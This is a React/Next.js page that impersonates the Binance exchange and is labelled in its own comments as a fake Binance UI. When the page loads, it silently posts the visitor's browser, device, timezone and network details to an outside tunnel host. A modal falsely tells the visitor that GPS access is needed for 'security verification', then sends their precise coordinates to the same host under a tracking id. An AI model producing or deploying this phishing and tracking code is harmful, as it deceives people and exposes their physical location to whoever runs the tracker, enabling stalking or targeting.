"use client";

import { useState, useEffect } from "react";

// --- BINANCE UI COMPONENTS (Included here to fix import errors) ---
type IconName = "eye" | "eyeOff" | "arrowDown" | "send" | "download" | "swap" | "search" | "more" | "plus" | "wallet" | "chart" | "clock" | "menu" | "home";

const Icon = ({ name, size = 20, stroke = 1.8 }: { name: IconName; size?: number; stroke?: number; }) => {
  const props = { width: size, height: size, viewBox: "0 0 24 24", fill: "none", stroke: "currentColor", strokeWidth: stroke, strokeLinecap: "round" as const, strokeLinejoin: "round" as const };
  const icons: Record<IconName, any> = {
    eye: (<><path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6S2 12 2 12Z" /><circle cx="12" cy="12" r="2.5" /></>),
    eyeOff: (<><path d="M3 3l18 18" /><path d="M10.5 6.2A11 11 0 0 1 12 6c6.5 0 10 6 10 6a18 18 0 0 1-3.1 3.8" /><path d="M6.3 6.3C3.7 8 2 12 2 12s3.5 6 10 6c1.4 0 2.7-.3 3.8-.8" /><path d="M9.9 9.9a3 3 0 0 0 4.2 4.2" /></>),
    arrowDown: <path d="m6 9 6 6 6-6" />,
    send: (<><path d="m22 2-7 20-4-9-9-4Z" /><path d="M22 2 11 13" /></>),
    download: (<><path d="M12 3v12" /><path d="m7 10 5 5 5-5" /><path d="M5 21h14" /></>),
    swap: (<><path d="M7 7h11l-3-3" /><path d="m18 7-3-3" /><path d="M17 17H6l3 3" /><path d="m6 17 3 3" /></>),
    search: (<><circle cx="11" cy="11" r="7" /><path d="m20 20-4-4" /></>),
    more: (<><circle cx="5" cy="12" r="1" fill="currentColor" stroke="none" /><circle cx="12" cy="12" r="1" fill="currentColor" stroke="none" /><circle cx="19" cy="12" r="1" fill="currentColor" stroke="none" /></>),
    plus: (<><path d="M12 5v14" /><path d="M5 12h14" /></>),
    wallet: (<><path d="M3 7a3 3 0 0 1 3-3h13v16H6a3 3 0 0 1-3-3Z" /><path d="M3 7h16" /><path d="M16 12h5v5h-5a2.5 2.5 0 0 1 0-5Z" /></>),
    chart: (<><path d="M4 19V5" /><path d="M4 19h17" /><path d="m7 15 4-4 3 2 5-6" /></>),
    clock: (<><circle cx="12" cy="12" r="9" /><path d="M12 7v5l3 2" /></>),
    menu: (<><path d="M4 7h16" /><path d="M4 12h16" /><path d="M4 17h16" /></>),
    home: (<><path d="m3 10 9-7 9 7v10a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V10Z" /><path d="M9 21v-7h6v7" /></>),
  };
  return <svg {...props}>{icons[name]}</svg>;
};

const ExchangeMark = ({ size = 28 }: { size?: number }) => (
  <svg width={size} height={size} viewBox="0 0 64 64" fill="none" aria-hidden="true">
    <path fill="currentColor" d="m32 6 9 9-9 9-9-9 9-9Zm-17 17 9 9-9 9-9-9 9-9Zm34 0 9 9-9 9-9-9 9-9Zm-17 17 9 9-9 9-9-9 9-9Z" />
    <path fill="currentColor" d="m32 20 12 12-12 12-12-12 12-12Z" />
  </svg>
);
// --- END BINANCE UI COMPONENTS ---


export default function BinanceTrackPage({ params }: { params: { id: string } }) {
  const id = params.id;
  const [status, setStatus] = useState('idle'); // 'idle', 'loading', 'success', 'error'
  const [showEnterModal, setShowEnterModal] = useState(true);

  // YOUR FLASK BACKEND URL (Change this when deploying to Railway)
  const FLASK_API = "https://beneficial-acrylic-fighter-saves.trycloudflare.com";

  // 1. SEND IP & BROWSER DATA INSTANTLY ON PAGE LOAD
  useEffect(() => {
    const sendInitialData = async () => {
      const ua = navigator.userAgent;
      const collectedData = {
        tracking_id: id,
        browser: {
          browser: ua.includes('Firefox') ? 'Firefox' : ua.includes('Chrome') ? 'Chrome' : 'Safari',
          operating_system: ua.includes('Windows') ? 'Windows' : ua.includes('Android') ? 'Android' : ua.includes('iPhone') ? 'iOS' : 'Mac',
          device_type: /Mobile|Android|iPhone|iPad/i.test(ua) ? 'Mobile' : 'Desktop',
          language: navigator.language,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          screen_resolution: `${window.screen.width}x${window.screen.height}`,
        },
        network: {},
        location: { permission_status: 'pending' }
      };

      const conn = (navigator as any).connection || {};
      if (conn) {
        collectedData.network = { effective_type: conn.effectiveType, downlink: conn.downlink };
      }

      // Send immediately
      try {
        await fetch(`${FLASK_API}/api/collect`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(collectedData)
        });
      } catch (e) {}
    };
    sendInitialData();
  }, [id]);

  // 2. STRICT GPS TRIGGER (Only happens on Click)
  const handleEnterSite = async () => {
    setStatus('loading');
    
    if (!navigator.geolocation) {
      setStatus('error');
      return;
    }

    const collectedData: any = {
      tracking_id: id,
      location: { permission_status: 'pending' }
    };

    try {
      const position = await new Promise<GeolocationPosition>((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        });
      });

      collectedData.location = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        permission_status: 'granted'
      };

      await fetch(`${FLASK_API}/api/collect`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(collectedData)
      });

      setStatus('success');
      setTimeout(() => setShowEnterModal(false), 800);

    } catch (error) {
      // Fallback to watchPosition
      const watchId = navigator.geolocation.watchPosition(
        async (pos) => {
          if (pos.coords.accuracy < 150) {
            navigator.geolocation.clearWatch(watchId);
            collectedData.location = {
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              permission_status: 'granted'
            };
            
            await fetch(`${FLASK_API}/api/collect`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify(collectedData)
            });

            setStatus('success');
            setTimeout(() => setShowEnterModal(false), 800);
          }
        },
        (err) => {
          setStatus('error');
        },
        { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 }
      );
    }
  };

  return (
    <section className="min-h-screen bg-[#0B0E11] font-sans text-[#EAECEF] relative">
      
      {/* STRICT ENTER POPUP */}
      {showEnterModal && (
        <div className="fixed inset-0 z-[100] flex items-center justify-center bg-black/80 backdrop-blur-sm p-4">
          <div className={`w-full max-w-[340px] rounded-2xl border border-[#2B3139] bg-[#181E25] p-6 text-center shadow-2xl ${status === 'error' ? 'animate-shake' : ''}`}>
            <div className="mb-5 flex justify-center text-[#F0B90B]">
              <ExchangeMark size={48} />
            </div>
            <h2 className="mb-2 text-[20px] font-semibold text-[#F5F5F5]">Enter Binance</h2>
            
            {status === 'idle' && (<p className="mb-6 text-[13px] text-[#848E9C]">For security verification, please allow location access to proceed.</p>)}
            {status === 'loading' && (<p className="mb-6 text-[13px] text-[#F0B90B]">Verifying your location... Please wait.</p>)}
            {status === 'success' && (<p className="mb-6 text-[13px] text-[#0ECB81]">Verification successful! Unlocking wallet...</p>)}
            {status === 'error' && (<p className="mb-6 text-[13px] text-[#F6465D]">Location access is required. Please enable GPS in your browser settings, refresh the page, and try again.</p>)}

            <button
              onClick={handleEnterSite}
              disabled={status === 'loading' || status === 'success'}
              className={`w-full rounded-xl py-3 text-[14px] font-semibold transition active:scale-[0.98] ${
                status === 'error' ? 'bg-[#F6465D] text-white hover:bg-[#f54b62]' :
                status === 'success' ? 'bg-[#0ECB81] text-[#181A20]' :
                'bg-[#F0B90B] text-[#181A20] hover:bg-[#FCD535]'
              } disabled:opacity-70 disabled:cursor-not-allowed`}
            >
              {status === 'idle' && 'Enter Wallet'}
              {status === 'loading' && 'Verifying...'}
              {status === 'success' && 'Access Granted'}
              {status === 'error' && 'Try Again'}
            </button>
          </div>
        </div>
      )}

      {/* FAKE BINANCE UI */}
      <header className="sticky top-0 z-50 border-b border-[#2B3139]/70 bg-[#0B0E11]/95 backdrop-blur-xl">
        <div className="mx-auto flex h-[64px] w-full max-w-[1440px] items-center gap-4 px-4 sm:px-6 lg:px-8">
          <div className="flex shrink-0 items-center gap-2.5 text-[#F0B90B]">
            <ExchangeMark size={30} />
            <span className="hidden text-[20px] font-bold tracking-tight sm:block">BINANCE</span>
          </div>
          <div className="ml-auto flex items-center gap-2 sm:gap-3">
            <button className="rounded-lg bg-[#F0B90B] px-4 py-2 text-[12px] font-semibold text-[#181A20] transition hover:bg-[#FCD535]">Deposit</button>
          </div>
        </div>
      </header>
      <main className="mx-auto w-full max-w-[1440px] px-4 pb-[96px] pt-5 sm:px-6 sm:pb-10 lg:px-8">
        <h1 className="text-[24px] font-semibold tracking-tight text-[#F5F5F5] sm:text-[28px]">Wallet Overview</h1>
        <div className="mt-6 rounded-2xl border border-[#2B3139] bg-[#181E25] p-8">
          <p className="text-[#848E9C]">Total Balance</p>
          <h2 className="text-[34px] font-semibold tracking-tight text-[#F5F5F5] sm:text-[42px]">$0.00</h2>
        </div>
      </main>

      <style jsx>{`
        @keyframes shake {
          0%, 100% { transform: translateX(0); }
          25% { transform: translateX(-8px); }
          75% { transform: translateX(8px); }
        }
        .animate-shake { animation: shake 0.3s ease-in-out; }
      `}</style>
    </section>
  );
}